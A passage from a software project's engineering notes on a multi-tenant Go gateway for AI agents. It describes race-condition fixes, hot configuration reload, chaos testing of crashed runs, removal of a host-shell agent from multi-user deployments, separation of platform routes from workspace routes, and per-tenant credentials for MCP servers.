  the mapping from surface to acceptance criterion can be checked instead of
  trusted;
- a named test file that stops looking like what the surface claims. Two kinds
  are recognised — `two-tenant` and `build-guard` — because they decay
  differently: a two-tenant test that no longer mentions a second workspace has
  drifted, whereas a build guard has no tenant to mention and its tell is that
  it reads the repository's source.

**Gaps are declared, not discovered, and do not fail the build.** `Blockers()`
mirrors `ownership.MultiUserBlockers`, including the part that makes it work: a
gate that failed on any recorded gap is a gate people route around by deleting
the record. Three gaps are recorded — Qdrant's filter tests need a live
instance, the p50/p95/p99 figures come from `make loadtest` rather than from a
test, and backup restore verification covers SQLite only. At boot they are
logged as warnings in multi-user mode; an *unclassified store* is still fatal,
because that is a hole nobody has looked at rather than one somebody wrote down.

### Widening the gate found a real data race on its first run

`internal/gateway` had never been run under `-race`, because the gate did not
include it. Adding it failed immediately, and not on a test artefact:

`handleRequestWorkspaceExport` passed the export job to a background goroutine
and then serialized **the same pointer** into the 202 response.
`workspaceexport.Run` sets `Status` to running as its first act — exactly when
the handler is encoding it. So the accepted-response body was being marshalled
by one goroutine while another wrote the fields it was reading, and the visible
form is a caller receiving a status that is neither the one before nor the one
after.

Fixed by snapshotting the job before the goroutine exists. A copy rather than a
mutex, because the two do not need to agree: the response describes the job **as
accepted**, and the caller polls the status URL for anything later. Locking
would make the response sometimes report a job that had already started — a
less useful answer arrived at with more machinery.

That race is the argument for the whole story. It had been there since MU-032,
in a handler with tests, and the tests could not see it because nothing ran
them the one way that would.

### Status

MU-037 criteria 1, 2 and 6 are closed — the surface inventory is machine-checked
and the gate executes it, revocation and role-change coverage is inventoried
under the identity and approvals surfaces, and the startup readiness rules were
already enforced by `internal/config/deployment.go`.

Criterion 3's load figures and criterion 4's Postgres/object-store restore and
chaos coverage are recorded as gaps rather than claimed. Criterion 5 —
independent security review — is not something this work can assert about
itself.

## MU-034 criterion 6 — chaos tests, without either of the obvious trades

The two options this looked like were both bad. Injecting faults into the run
path means adding permanent injection points to production code for a test's
benefit. Spawning real workers and killing them means a slow suite whose
failures are as likely to be the harness as the code.

Neither is necessary, because **a crashed worker is not a special event — it is
a worker that stops calling.** Every step of the run path is already a separate
call against the record (`beginRun`, `holdRunLease`, `MarkSideEffect`,
`finishRun`), and the whole point of the record is that it survives the process.
So "crash at point N" is: run the production sequence to N, stop, let the lease
lapse, sweep, assert the policy. No new production code, no subprocesses, and
the thing under test is the real function at every step.

**The lease is what made this expressible.** Before it, every unfinished run
looked identical to recovery, so a test could not distinguish "the worker
crashed here" from "the worker is still working". The side-effect marker is what
turns *where* it crashed into an observable state. Criterion 6 was not merely
unbuilt before this milestone — it was unbuildable.

The crash is expressed as the worker's **last renewal carrying an already-lapsed
lease**, through the same `RenewLease` the worker calls. Reaching into the table
would test the recovery predicate against a state no production code produces;
sleeping out a real sixty seconds would cost a minute per crash point for no
extra confidence. The harness then *confirms* the lease is dead, because if it
were still live every assertion would pass for the wrong reason — recovery would
ignore the run as busy, and "recovery did nothing" is what several of these
tests expect for entirely different reasons.

### Two pairs of crash points are deliberately one test each

**Claim and provider call.** A provider call is not a side effect in the sense
that matters: it costs money and may have been logged, but nothing *outside* the
deployment changed state. The record deliberately does not distinguish them,
because the safe action is the same — re-queue — and a record that did
distinguish them would invite somebody to treat the second as unsafe and fail
runs that could simply be retried.

**Tool side effect and event publish.** Publishing an event is something the
deployment did to itself, and by the time one is published the tool has already
run, so the marker is already set and the safe action is already decided. An
event publish adds no information to the recovery decision, and building a
separate state for it would model a distinction that changes nothing.

`TestChaosCoversEveryPointTheCriterionNames` maps each point in the criterion's
list to the test that covers it and reads its own source, so deleting a test
fails the build rather than silently shrinking the coverage the criterion
claims. A list is exactly the kind of thing a suite drifts away from one
deletion at a time.

### The gate rejected my first attempt, correctly

Adding the surface to `internal/releasegate` failed: the chaos suite is neither
`two-tenant` nor `build-guard`. Its adversary is a crash, not a neighbour, and
it does not read source. Mislabelling it to get a green build would have been
the moment that taxonomy stopped meaning anything — a kind nobody can be wrong
about checks nothing. `KindFaultInjection` exists because the guard said so.

### And it found another race

Adding `internal/app` to the gate under `-race` failed immediately.
`watchForCancellation`'s stop function returned the moment its `done` channel
closed, so a "stopped" watcher could still be mid-poll — holding a database
handle for a record nobody is watching, which is the exact thing its own doc
comment says stopping prevents.

It now waits for the goroutine, matching `holdRunLease`. The test observes the
goroutine's exit rather than sleeping, because a sleep-based version passes on
the broken build whenever the scheduler runs the goroutine first — which is most
of the time, which is why it survived.

That is the second real race the widened gate has found in two runs, both in
code with tests, both invisible to those tests because nothing ran them the one
way that would.

### Status

MU-034 is closed. All of MU-034's six criteria are met.

## Configuration changes must not require a restart

A directive rather than a story: platform-level configuration changes should be
rare, and **nothing tenant-specific may require a gateway restart**.

### Why single-tenant made "save and restart" reasonable

In a Personal deployment the operator, the tenant and the person restarting the
process are one person. "Save it and restart" costs them ten seconds of their
own time, so it was a defensible default and it spread — into channel saves,
into provider advice, into the plugin lifecycle, into the config PATCH
response.

In a Team deployment those are three different people. One workspace's admin
saving a Slack token would be asking every other workspace to accept a service
interruption. That is not a worse version of the same trade; it is a different
trade, and the answer flips.

### The state before

Most of what reads as "tenant config" is not tenant-scoped yet. Channels are the
clearest case: a workspace's Slack bot, Telegram token and Discord webhook live
in the platform-wide `config.yaml`, and `Registry.BindWorkspace` — the function
that would make a connection workspace-owned — has **zero production callers**.
The MU-018 ownership machinery exists and nothing uses it.

Worse, the restart advice was wrong in **both** directions at once:

- A dozen places told operators to restart after saving a provider key. That has
  been hot for some time. The advice cost them a restart they did not owe.
- The channel handlers said the same thing and were telling the truth — the
  save path wrote YAML, updated a display copy and never touched the live
  registry. The advice was accurate because the code had given up half-way.
- `ReloadConfig` re-applied exactly **one** subsystem, MCP servers, out of
  thirty. Editing a rate limit, a search provider or a quota through the API
  updated the settings page and changed nothing, with no message saying so.

A silent no-op is worse than an honest restart note. A restart note is a cost
the operator can choose to pay; a no-op is a cost they do not know they are
paying.

### The catalog, and the one rule it enforces

`internal/confighot` classifies every section of `config.Config` as
tenant-scoped or platform-scoped, and live or boot-only. `Validate` refuses one
combination:

> A tenant-scoped section may not be boot-only.

The guard walks the **real struct by reflection**, so adding a config section
without deciding fails the build — which is the failure a hand-kept list cannot
see, and the one that produced thirty unclassified settings.

Boot-only entries carry a **reason**, and the reason has to be a property of the
setting rather than the state of the code.
`TestBootOnlyReasonsAreArgumentsNotExcuses` rejects "not implemented", "hard
to", "nobody has" and their relatives. "Rebinding a listening socket means
closing every connection on it" is a reason; "nobody wired it" is a TODO.

Sixteen sections are genuinely boot-only, and all sixteen are things an operator
sets once at install: the listening socket, the auth mode, the deployment mode,
the storage/queue/vector backends, the executor pool, the logger.

### What had to be built to make the rule true

**Channels.** `Registry.StartAdapter` already existed and was already used live
by the WhatsApp pairing flow, so *connecting* without a restart was possible.
`StopAdapter` did not exist, and a save path can only be hot if **both**
directions are — an operator who can enable live but must restart to disable
has a restart in their workflow either way.

The hot apply reproduces boot's own registration path against a scratch
registry rather than reimplementing it. `registerChannels` holds every
per-channel rule there is — multi-bot expansion, adapter ID derivation, the
capability-tier binding gate — and a second implementation for the hot path
would drift in the direction of a channel behaving differently after a save than
after a restart. That is the worst possible divergence, because it only appears
once somebody restarts.

It also means "which adapters belong to channel X" is answered by **building
from the previous config**, not by an ID-prefix convention every future channel
type would have to remember to obey.

**Providers.** Deleting one removed it from the config file and left the
constructed client in the router for the life of the process — so a provider
removed *because its key leaked* stayed callable by every agent, and the
providers page reported it as registered with no configuration behind it. Half a
hot path is worse than none: it makes the deletion look like it worked.
`llm.default_provider` had the same shape one level up — editing it updated
everything that consults the config and nothing that consults the router.

Making `defaultID` writable meant the unguarded reads of it became a data race
on **every completion in the process**, so `Complete` and `Provider` now resolve
it under the lock. Worth recording: the field was safe to read unguarded for
exactly as long as it was immutable, and adding one setter changed that
everywhere at once.

**Rate limits** had a full editing surface and no effect. The counter *backend*
is deliberately still boot-only — switching memory↔redis live would discard
every in-flight window, handing out a free burst at exactly the moment somebody
is trying to tighten a limit.

**Plugin settings — a bug this work exposed rather than created.** Settings were
attached once, by `plugins.Wire`, to the loaders that existed at boot. The
`Invalidate` added earlier this milestone then started discarding loaders so a
lifecycle change could take effect — and the replacement was a fresh scan with
nothing attached. So revoking **one** plugin silently stripped every **other**
plugin's configuration in that workspace until a restart. The symptom is the
worst kind: a plugin stops working for a reason unrelated to anything anybody
changed, and recovers on restart, which makes it look intermittent.

**The secrets overlay.** `secrets.Migrate` blanks vault-backed values in memory
as well as on disk and relies on `Overlay` to restore them. `Overlay` ran once,
at boot; `ReloadConfig` calls `config.Load`, which re-reads the blanked file.
So **every config write** emptied every provider key and channel token in the
in-memory config. Nothing broke functionally — the router and the started
adapters hold constructed clients — but `GET /config` rendered empty keys, the
doctor began telling operators to re-save keys that were safely in the vault,
and the channel handler's "keep the existing value when the browser sends the
mask" branch read the blanked map and discarded the token.

### The PATCH response now computes its answer

It used to say "restart for changes to take full effect" for every patch:
simultaneously too strong (most sections are live) and too weak (no way to know
whether *yours* was one of the few that is not). Both failures push the operator
toward not reading it. It now returns the edited sections that `confighot`
classifies as boot-only, by name, and says everything else is already live.

### Three guards

- `TestEverySectionOfTheRealConfigIsClassified` — reflection over
  `config.Config`; a new section fails the build until somebody decides.
- `TestReloadConfigAppliesEverySectionTheCatalogCallsLive` — the catalog is a
  wish without this. A section could be classified live, name a real function,
  and have nothing on the reload path calling it — which is exactly the state
  this started from.
- `TestNoHandlerStillTellsOperatorsToRestartForALiveSection` — found all eight
  stale messages, including one of mine. Advice naming a genuinely boot-only
  section is allowed; anything else fails.

### Left visible rather than half-fixed

`s.cfg` is read by every handler on every request and written by the file
watcher's goroutine. That is a data race today. A mutex taken only on the write
side would buy nothing and would read as though the problem were handled, which
is worse than the race because it stops anybody looking. Fixing it properly is
an accessor and several hundred call sites — its own change.

---

## Bug-fix pass — the eleven things that were wrong

Nothing in this section is a story. It is the list of defects found while
writing the milestones above, fixed in one pass, each with the guard that would
have caught it.

### 1. `s.cfg` — the race that was left visible

The previous section ends by recording this as unfixed. It is fixed now, and
not with the mutex that section rejected.

`Server.cfg` is an `atomic.Pointer[config.Config]`; every read goes through
`s.config()`, which hands back an immutable snapshot. A mutex would have removed
the race and introduced a subtler one: a handler that reads the config twice in
one request can straddle a reload and act on two different configurations. A
snapshot pointer removes both — a request sees one configuration from beginning
to end.

Writes clone. `mutateConfig` copies the snapshot, applies the edit and
publishes; `setProviderConfig` and `setChannelConfig` rebuild the map rather
than assigning into the one every in-flight request still points at, because
writing into a shared map is the same race one entry at a time.

`TestNoProductionCodeWritesThroughTheConfigSnapshot` is an AST guard: any
assignment rooted at a `config()` call fails the build. Test files are
deliberately exempt — a test mutates before it serves anything, from the
goroutine that built the Server, so there is no concurrent reader.

### 2. `/ping` answered from the config instead of from the middleware

The setup wizard said the gateway was "open to anyone who can reach it" and
`/ping` reported `auth: open`, while every API request returned 401. `/ping`
reimplemented one of the two auth middlewares inline, from config fields, and
so was wrong for whatever the other one does.

`Server.authPosture` now answers the actual question — what would the installed
middleware do with an uncredentialed request — and reports a third state,
`unreachable`, for a deployment that is armed and impossible to authenticate
against. `open` and `unreachable` are opposite problems; collapsing them sends
an operator hunting an exposure that does not exist.

**A second bug fell out of it.** `auth.Engine.Effective()` returns true for jwt
mode with an ephemeral issuer and nothing else, because an issuer exists. But
the only way to obtain one of its tokens is the token exchange, which
authenticates with the static key, and `secretEqual` refuses an empty expected
secret. The engine rejects every request forever while reporting itself
effective. `Reachable()` now separates *can verify a credential* from *anyone
can get one*; a local issuer counts as the first and not the second.

### 3. Scale mode's blockers were recorded and never shown

`config.ScaleReplicationBlockers()` enumerates seven reasons a second replica
misbehaves — artifacts on local disk, in-memory conversations, replica-affine
approvals and cancellation, per-process idempotency and failure counters. It
was dead code. An operator who configured everything scale mode asks for
watched every check pass and had been told, by the only channel available, that
they were ready to scale out.

It is now printed at boot, **one warn record per blocker** — a single summary
line naming seven problems reads as one problem — and surfaced by `sy doctor`
as its own check, separate from "deployment mode: ok". Those answer different
questions: *is this configuration valid* (yes) and *can I run two of these* (no).

Warn rather than fatal: scale mode with one replica is how an operator stages
the infrastructure before turning the second one on.

### 4. The NATS warning sent scale operators in a circle

One warning told every NATS user that "the default in-memory queue is the
supported path" — advice scale mode's own validation forbids. Now two messages.
Outside scale it still says revert. Inside scale it says the honest thing: the
queue is required, it is unvetted, exercise failover or supply your own with
`queue.backend: external`.

`deployment.shared_artifact_store` stays required and its message now says the
value is **recorded and not yet used**.

### 5. The unsafe-prerequisites waiver waived the check, not the dependency

A Team install with `unsafe_multi_user_prerequisites` and no `postgres_dsn`
passed validation, started, and died at the tenancy pool ping with a connection
error that reads like a network problem. Boot now refuses by name: the
acknowledgement waives the configuration check, not the dependency, and there
is no SQLite-backed multi-user deployment.

### 6. Capability grants were global and survived revocation

`caps.Enforcer` keyed its grant sets by plugin ID alone. Agent IDs are unique
per workspace, not per deployment (trap 2), and so are plugin IDs: one
workspace installing a plugin granted its capabilities to every workspace, and
two workspaces installing the same plugin ID overwrote each other's grants.
Revoking a plugin left its capabilities in place until a restart.

Keys are now `workspaceID \x00 pluginID`, `Check` requires a workspace, and
`Server.reconcileCapabilities` replaces a workspace's grants wholesale on every
lifecycle change — `ReplaceWorkspaceSets`, not an incremental add, because a
grant that should have disappeared is exactly what an incremental update misses.

### 7. A clean shutdown recovered less work than a crash

One `cancel()` on SIGTERM began the gateway's polite drain **and** cut every
executing run off mid-tool-call. Worse, the cancelled run was recorded `failed`
— terminal — and the recovery sweep skips terminal runs by design. A crash
leaves the run `running` with a lapsing lease, and recovery then applies the
real policy. So `systemctl restart` lost work that `kill -9` would have
recovered, which is backwards, and it only shows up in a deployment that
restarts often — a Team install doing rolling upgrades.

`runDrainContext` detaches the run's context with `context.WithoutCancel` and
cancels it `runDrainGrace` later, and the outcome path writes **nothing** when
it is draining. The run stays `running` with no holder, which is what a crashed
worker leaves, so recovery makes the decision it was written to make.

### 8. A paused run and its approval were orphaned by every restart

Two boot sweeps, each correct alone, producing a state neither would choose.
The run sweep skips `paused` runs — a pause is somebody's deliberate state, not
wreckage. The approvals sweep closes every pending approval — a restart severs
the channel the paused run was waiting on. Together: the run stays `paused`, the
approval becomes `invalidated`, nothing can move either, and no error is logged
because both halves succeeded.

The premise the run sweep relies on stops holding at the instant the approval is
invalidated. So `approvals.Store.PendingRunRefs` is read **before** the
invalidation, and `runs.Store.ResolveOrphanedPause` then recovers those runs as
what they now are — interrupted — applying the *same* policy as the crash sweep
rather than a second one. Requeued runs join the existing re-enqueue loop,
because a record set back to `queued` without a message is queued forever.

Order is a build guard: `TestBootReadsTheBlockedRunsBeforeItInvalidatesTheirApprovals`
fails if the list is taken after the invalidation (it would be empty) or if the
runs are resolved before it (a run released in between would be moved out from
under a decision somebody actually made).

### 9. `costs` and `llm` were classified live and were half live

`reloadQuotaPolicy` recomposed the per-subject budgets. The provider-level half
of the same two sections — `allowed_providers`, `allowed_models`,
`allowed_regions`, and every per-provider data class, region, retention and
tokens-per-minute policy — was snapshotted into the governor at boot and never
read again. Removing a provider from the allow-list saved to disk, appeared in
the settings page, and changed nothing about what the process would call. Those
are access controls; a silently unapplied access control is the worst kind.

`Governor.cfg` is now an atomic snapshot with `SetGovernance`, `costs.GovernanceFrom`
is the single translation from config shared by boot and reload, and
`applyGovernanceLive` runs on every reload.

`releaseProvider` no longer consults the live `max_concurrent_per_provider` to
decide whether to hand back a slot taken under the old one. Turning concurrency
limiting off mid-call leaked every outstanding slot, and the provider stayed
permanently at capacity once it was turned back on, with no error anywhere.

**`Section.AppliedBy` is a list now.** It was one name, and naming only the
first applier is precisely how a section comes to be half live.

### 10. The catalog guard vouched for nothing

`TestReloadConfigAppliesEverySectionTheCatalogCallsLive` searched config.go for
`symbol + "("`. `func (s *Server) applyLLMLive(` contains `applyLLMLive(`, so an
applier **defined** in that file satisfied the search whether or not anything
called it — deleting the call from `ReloadConfig` kept the test green. Collecting
every call site in the file was the next attempt and was also wrong: deleting
`applySearchLive`'s call still passed, because the `SetSearchConfig` call *inside*
the now-dead applier was still there.

The guard now walks the call graph from `ReloadConfig`, following helpers defined
in the same file. Reachability is the property the catalog asserts, so it is the
property checked. All eight appliers were mutation-tested against it.

### 11. `internal/caps`, `internal/costs`, `internal/approvals` and `internal/auth`
were not in the isolation suite

All four now carry cross-tenant or concurrency guarantees. `make security` runs
them under `-race`.

### Verification

Full `go test ./...`, `make security` (28 packages under `-race`), GUI 840 tests
/ 76 files. Every guard in this pass was mutation-tested: removed, failure
observed, restored. Two survived the first attempt and were rewritten — the
config-applier reachability guard above, and the slot-release test, which needed
to assert on the pending-release list rather than on a later acquire.

---

## The System agent is withdrawn from Team and Scale

A design decision, recorded because it changes behaviour for existing
multi-user installations.

### The question

The built-in System agent runs shell commands, writes files, installs packages
and edits this deployment's own config file. Should a Team or Scale member be
able to chat with it?

### What was actually true

It is a platform built-in, and `Loader.GetInWorkspace` falls back to the
platform copy for any workspace, so **every member of every workspace** could
reach it. Meanwhile the deployment operator could **not**: `workspaceContextMW`
refuses the static server key on the workspace APIs in multi-user mode, by
design and correctly. So the agent was available to precisely the wrong people.

`runtime.allow_system_agents` defaults empty, so `shell_exec` and friends were
off — but `package_install` is deliberately exempted from that gate for the
System agent, and it runs the installer **outside** the privileged-command
sandbox (it needs network and must persist to the real workspace). In Team mode
every other privileged tool is forced into Docker. That one ran on the host.

Two further routes granted the same thing by naming rather than by policy: a
`SOUL.yaml` with `id: system` was PROMOTED on load — enabled, `SystemTools:
true`, the full privileged confirm list — and `UpsertInWorkspace` did the same
for anything reaching it with that ID, which includes the package importer and
Studio, neither of which takes the ID from a person.

### The decision: no, and not "restricted to admins" either

Restricting it to a role does not work, because the role model cannot express
the distinction. `owner` in Team mode is a **tenant** owner — the person who
runs a workspace, not the person who runs the machine. Host shell for a tenant
owner is the same mistake one level up.

Nor is scoping available. Every other capability here is isolated
structurally — a derived path, a map key, a parent join. There is no path to
derive for "run an arbitrary command" and no workspace it belongs to. When a
capability cannot be scoped, the remaining lever is access.

So in Team and Scale the agent **does not exist**. Deployment administration
happens on the host, through the `sy` CLI, the config file, and the GUI's MCP
and plugin pages — all of which are properly workspace-scoped and RBAC'd.
Multi-user mode had already separated deployment administration from tenant
activity everywhere else; this was the exception.

### Removed, not filtered

`Loader.SetPlatformAgentsEnabled(false)` deletes the map entry. Chat, streaming,
manual trigger, replay, schedules, channel delivery and peer expansion all
resolve through that map, so one decision closes all of them — a filter would
have to be repeated at each entry point and would be missing from the next one
somebody adds. The `package_install` exemption is closed for free, because it
tests `def.ID == SystemAgentID` on a definition that is no longer returned.

Three details the first attempt got wrong, each now with a test:

- The eviction filtered on the builtin sentinel, which would have spared a
  **file-backed** `system` definition — exactly what an upgrading installation
  is most likely to have.
- `IsBuiltinInWorkspace` returned true for the ID unconditionally, so peer
  expansion, the delete guard and the GUI badge described an agent that was not
  there.
- The stale-file sweep restores a built-in when its overriding SOUL.yaml
  disappears. It now checks the switch. That clause is unreachable given the
  eviction above and stays anyway: the invariant must not depend on the order
  of two calls in the wiring code, and reordering them is a refactor somebody
  will make.

### The loader takes a boolean, not a mode

`internal/runtime` knows nothing about deployment modes and is better for it.
The policy lives in `config.Config.PlatformAgentsEnabled`, is decided once in
`wireLoaders`, and is applied **before** `LoadAll` — because `LoadAll` is where
a SOUL.yaml claiming the reserved ID would otherwise be promoted.
`TestBootDisablesPlatformAgentsBeforeItLoadsAnyFromDisk` checks both the call
and the order; `TestOnlyTheConfigPolicyDecidesWhetherPlatformAgentsExist` fails
the build if a second place starts deriving the same answer.

### The waiver

`deployment.acknowledgements: [unsafe_tenant_system_agent]` restores it. A
single-tenant Team install run by the person who owns the machine is a real
configuration, and an operator with no path forward patches the binary. Boot
warns when it is waived and explains where the feature went when it is not;
`sy doctor` reports both directions on every run, because a boot log is read
once.

It is a **separate** acknowledgement from `unsafe_multi_user_prerequisites` and
a test pins that they are not interchangeable — writing one and getting the
other teaches operators to write both.

### Personal is untouched

Invariant 7. One tenant, who owns the machine: "the agent can reach the host"
and "the user can reach the host" are the same sentence there.

### Still open

`package_install` writes to the deployment-wide `mcp.servers` block and installs
under the process-global `mcp-servers/<id>` path rather than a `wsroot`-derived
one. With the agent withdrawn from multi-user this is no longer a cross-tenant
escalation, but it remains wrong: two tenants installing the same server ID
still collide if the waiver is used. Recorded, not fixed.

---

## There is no platform administrator, and three endpoints assume there is

Found while answering "will there be a super admin". Recorded in full because
the answer is currently *no*, and several endpoints are written as though the
answer were yes.

### What exists today

Every `/api/v1` route passes through `workspaceContextMW`, which in multi-user
mode requires a verified workspace membership and **refuses the bootstrap
`server.api_key` outright**. That refusal is correct: the static key names no
workspace, so it cannot be given one.

The consequence is that in Team and Scale, *every* authenticated principal is a
member of some workspace. There is no principal that means "operator of this
deployment". The role names do not help: `owner` and `admin` in `defaultPolicy`
are **membership** roles — owner of a workspace, i.e. a customer.

### Three powers that are not a customer's to hold

`ResourceConfig` is granted `{read, write}` to both `owner` and `admin`, and it
gates:

- **`POST /admin/restart`** — calls `os.Exit(0)`. One workspace's admin stops
  every workspace's runs, streams and scheduled work.
- **`PATCH /config`** — writes the single deployment-wide config.yaml: LLM
  providers and keys, budgets and enforcement mode, security settings, channel
  configuration, the MCP server template.
- **`/plugins/*` and `/registries`** — plugin lifecycle and registry list,
  persisted deployment-wide.

`/admin/dlq` and `/admin/audit` are fine: both are already scoped per
workspace.

### Fixed now: restart

`Server.restartRefusal` refuses in multi-user mode with a message naming the
host as the place to restart. It is a separate function from the handler
because both answers need testing and the allowed path ends in `os.Exit(0)` —
a test that drives the handler to completion takes the test binary with it. A
source guard checks the handler consults it, and consults it BEFORE spawning
the replacement process: a check after the spawn refuses a restart that has
already happened.

Personal is untouched. One person restarting their own gateway.

### The design for the rest

A super administrator should exist, and it should be the **bootstrap
credential**, not a new role.

The reason is that the two things are different in kind, not in degree. A
workspace role answers "what may this member do inside their workspace"; no
amount of it should ever add up to "and also the machine". Adding a
`superadmin` value to the membership roles would put deployment power on the
same ladder as tenant power, one promotion away — and the promotion is
performed by another tenant admin.

So: split the API surface in two.

- **Workspace routes** keep `workspaceContextMW` exactly as it is.
- **Platform routes** — restart, `PATCH /config`, plugins, registries, the
  deployment-wide half of the admin group — move to a group that requires the
  platform credential and *no* membership, and `ResourceConfig: write` is
  removed from the tenant roles.

That is a route-partition change, and a wrong partition is itself a security
bug, so it wants doing as its own unit with the inventory above as the
checklist rather than folded into another change.

### Done

Closed by the route partition below.

---

## The platform/workspace route partition

The fix for the gap above. Nineteen endpoints that change the DEPLOYMENT now
require the deployment's own credential; workspace roles cannot reach them.

### The seam is the route, not the role

A `superadmin` membership role would put deployment power on the same ladder as
tenant power, one promotion away — and the promotion is performed by another
tenant's admin. A workspace role answers "what may this member do inside their
workspace", and no amount of it should add up to "and also the machine". The
two are different in kind.

The platform principal is therefore the **bootstrap `server.api_key`**, which
already means "operator of this deployment": multi-user validation requires it,
it belongs to no workspace, and `auth.Engine` stamps it with a distinguishable
credential ID. Nothing new was invented, which keeps the number of things that
can administer the machine at one.

### Why a table

Fiber registers group middleware by path PREFIX: a second
`app.Group("/api/v1", …)` with different middleware is still wrapped by the
first group's. So a separate router was not available, and `internal/gateway`
gets `platformRoutes` — a table consulted in `workspaceContextMW`, the one
middleware every request already passes through, exactly where
`workspaceAdmission` sits for the same reason.

`TestTheTableAndTheRegistrationsAgree` fails the build in **both** directions.
A route registered with `platformMW` and missing from the table is admitted by
the workspace middleware, which then demands a membership the operator's
credential cannot have — refused for everyone, including the operator. A table
entry with no registration guards nothing while reading as though it does.

Matching is segment-wise, not by prefix. A prefix match on `/api/v1/mcp` would
claim `POST /api/v1/mcp/test` — same method, and a workspace-level question
("is the server I described reachable"). The mutation that swapped in prefix
matching survived the first version of that test, because every example in it
differed by METHOD from the platform templates and the method check rescued
them; the test now names the one route that collides on both.

### Personal is unchanged

`platformMW` delegates to `rbacMW` outside multi-user mode. One tenant who owns
the machine: "may this member change the config" and "may this operator change
the config" are the same question there. Invariant 7.

### Three existing guards had to be taught, not loosened

- `TestEveryMutatingRouteAuthorizesItself` learned `platformMW` is
  authorization. It is *stricter* than `rbacMW`, not looser.
- `TestAllProtectedAPIRoutesFailClosedWithoutWorkspaceResolverInTeamMode` had
  its assertion for `/api/v1/config` **inverted**, which is the honest reading:
  a platform route needs no membership, so a missing tenancy resolver is not a
  reason to refuse the operator — and that is exactly the moment the operator
  is trying to fix the settings that are broken.
- The route-architecture prober now expects platform routes to ACCEPT the
  bootstrap key. The other direction — a workspace member refused — cannot be
  expressed there, because that loop authenticates with the static key and any
  other bearer fails at 401 before authorization runs; it is asserted in
  `platformroutes_test.go` instead.

### A restart is now a deliberate act

Allowing the operator through `POST /admin/restart` immediately restarted the
test binary: our own route prober walks every protected route and sends a bare
POST, and the endpoint had no body. A monitoring probe or a security scanner
would have done the same to production.

In multi-user it now requires `{"confirm":"restart"}`. Personal does not — the
blast radius there is the one person pressing the button, and friction with
nothing behind it is how people learn to click through warnings. The GUI sends
the confirmation.

`restartRefusal` still re-checks the principal inside the handler even though
`platformMW` already did. The consequence of this route being re-registered
with ordinary RBAC middleware some day is every tenant's work stopped by a
customer, and that is worth two lines.

### Reads stayed put

Seeing the deployment's plugin list or MCP template is not changing it, and a
tenant that cannot read the settings page it is shown gets a broken product
rather than a safer one. `GET /api/v1/mcp` was checked rather than assumed: it
is workspace-scoped through `s.mcpFor(c)` and already masks `env` and
`headers`.

### Since built

Tenant-authored MCP server definitions — see the two sections at the end.

`sy package install` still writes that template and installs under a
process-global path. Its only caller in multi-user is the operator on the host,
now that the System agent is withdrawn there — so the collision it can cause
requires the `unsafe_tenant_system_agent` waiver, which is an acknowledged
choice by name.

---

## MCP servers ran as the operator, in every tenant

The pool built for MU-017 criterion 5 gave each workspace its own subprocesses.
That closed the filesystem half of the problem — two tenants' relative paths
resolve to two different trees — and did nothing about the other half.

Every one of those processes was started from the operator's template, `Env`
and `Headers` included. That is where a server's `GITHUB_TOKEN` and its
`Authorization: Bearer sk-…` live. So tenant A's agent called
`github__list_repos` **as the operator**, and saw everything the operator's
token sees — which includes everything tenant B pushed.

Upstream, the whole deployment was one identity: no per-tenant attribution, no
per-tenant rate limit, and no way to cut off one tenant without cutting off
every tenant. Isolating the process while sharing the identity isolates nothing
that matters.

The platform/workspace partition made it worse before it made it better. Moving
the MCP write routes behind `platformMW` was right about who may edit the
CATALOG and wrong as a whole answer, because it left the shared template as the
only way a tenant could have a server at all.

### A credential is derived, never inherited

The same rule the filesystem roots, the scratch directories and the vault's own
encryption keys already follow. `internal/mcp/tenantcreds.go` replaces every
secret in a template server with the workspace's own before that workspace's
client is built.

Which keys are secrets is decided by `redact.SecretKeyName` — the single
predicate this repo already uses for "does this look like a credential", so MCP
does not become a fifth opinion about it. A template `LOG_LEVEL` or
`GITHUB_ORG` is configuration the operator meant to share and passes through; a
template `GITHUB_TOKEN` is an identity and does not.

An empty template value is a placeholder telling the tenant what to fill in,
not a secret being shared, so it is still required rather than passed through
as `""` — otherwise the server starts unauthenticated and the tenant gets a
confusing upstream error instead of a setup step.

### Withheld, not fallen back

The obvious design is "the tenant's value if they set one, otherwise the
operator's". Its failure mode is silence: a tenant who has not supplied a token
gets the operator's, everything works, and the bug is wearing the costume of a
working feature.

A server whose credentials a workspace has not supplied is **not started for
that workspace**, and `GET /api/v1/mcp/pending` says which credentials it still
needs. Withholding without reporting would be the same feature with a worse
error message — a tenant whose tool is simply absent cannot tell a withheld
server from a broken one.

The vault being unreachable resolves to "not supplied" too. Falling back there
would leak exactly when the vault is broken and nobody is watching MCP.

### The workspace half of the API

- `PUT /api/v1/mcp/:id/credentials` — the tenant's own value, stored in the
  per-workspace credential vault, which already encrypts under a per-workspace
  data key. Two tenants' ciphertext is unreadable to each other even if a query
  loses its predicate, which is a stronger boundary than a column filter and is
  the reason not to invent a second store.
- `GET /api/v1/mcp/:id/credentials` — names only.
- `DELETE /api/v1/mcp/:id/credentials/:key` — withholds the server again rather
  than falling back.
- `GET /api/v1/mcp/pending` — what this workspace still has to supply.

Workspace routes, not platform ones. Writing the server DEFINITION is the
operator's job; supplying the identity it runs as is the tenant's, and is the
only thing that makes a shared catalog usable by anyone but the operator.

Setting a credential invalidates that workspace's client so the server appears.
Without it the tenant sets their token, sees nothing change, and concludes the
feature is broken — which is how a correct security control gets turned off.

`mcp.CredentialNamespace` is shared by the writer and the reader so they cannot
disagree about where a token went; two spellings of that string is a credential
that saves successfully and is never found. It is prefixed `mcp:` because
`ValidateAgentID` rejects `:`, so a workspace with an agent literally named
`github` cannot share a namespace with the `github` MCP server.

### The escape hatch is a sentence somebody wrote

`shared_credentials: true` on a server lets the operator's values travel
unchanged. Right for a server with no secrets, or one whose credential is
genuinely deployment-wide such as a site licence. Wrong for anything that can
reach a tenant's data, and it is spelled out in config.yaml so that turning it
on is a decision rather than a default.

### Personal is untouched

`RequireTenantCredentials` is called only in multi-user mode, and the pool
takes a boolean plus a resolver rather than a deployment mode — `internal/mcp`
has no business knowing what mode the process runs in, the same reason
`internal/runtime` does not. One tenant whose credentials genuinely are the
operator's. Invariant 7.

A build guard checks boot installs the requirement, and installs it BEFORE the
pool is published to the engine: whichever workspace makes the first MCP call
would otherwise keep a client built under the old rules.

---

## plugins_config was the same leak, one layer down

A plugin's DECLARED credentials (`credentials:` in the manifest) have resolved
per workspace through the vault since delegation.go was written. Its
`settings:` section did not: `plugins_config` is one map, held once in
`Stores`, attached to every workspace's loader.

Settings are meant to be configuration, so most of the time this is harmless.
Nothing stopped an author putting an API key there instead of declaring it, and
